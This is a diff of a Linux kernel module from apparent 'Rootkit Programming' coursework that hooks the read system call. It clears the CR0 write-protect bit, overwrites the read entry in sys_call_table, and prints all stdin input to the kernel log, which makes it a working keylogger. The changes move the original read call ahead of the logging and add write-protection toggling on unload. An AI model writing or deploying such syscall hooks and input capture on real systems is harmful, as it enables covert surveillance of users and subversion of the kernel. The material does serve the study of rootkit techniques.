@@ -22,7 +22,7 @@
 #include "sysmap.h"
 
 #define DRIVER_AUTHOR "Rootkit Programming"
-#define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"
+#define DRIVER_DESC   "Assigment 2 - System Call Hooking"
 #define BUF_SIZE 1024
 
 void ** syscall_table = (void * *) sys_call_table_R;
@@ -49,13 +49,19 @@ static void print_nr_procs()
 }
 
 static ssize_t my_read(int fd, void *buf, size_t count){
+	ssize_t retVal;
+	int i;
+	retVal = orig_sys_read(fd, buf, count);
 	if(fd == 0){ //stdin
-		//printk(KERN_INFO "count: %d\n", (int)count);
-		strncpy(charbuf, buf, (count<BUF_SIZE-1)?count:BUF_SIZE-1);
-		charbuf[count+1] = '\0';
-		printk(KERN_INFO "stdin: %s\n", charbuf);
+		/*for(i=0;i<count;i++){
+			printk(KERN_INFO "%c", ((char *)buf)[i]);
+		}*/
+		i = (count>BUF_SIZE)?BUF_SIZE:count;
+		strncpy(charbuf, (char*)buf, i);
+		charbuf[i]='\0';
+		printk(KERN_INFO "%s\n",charbuf);
 	}
-	return orig_sys_read(fd, buf, count);
+	return retVal;
 }
 
 static int __init mod_init(void)
@@ -70,7 +76,7 @@ static int __init mod_init(void)
   
   cr0 = read_cr0();
   write_cr0(cr0 & ~0x00010000);
-  
+
   
 
   addr = (unsigned long) syscall_table;
@@ -94,6 +100,7 @@ static void __exit mod_exit(void)
 {
   unsigned long cr0;
   cr0 = read_cr0();
+  write_cr0(cr0 & ~0x00010000);
   syscall_table[__NR_read] = orig_sys_read;
   write_cr0(cr0);
   printk(KERN_INFO "Goodbye!\n");
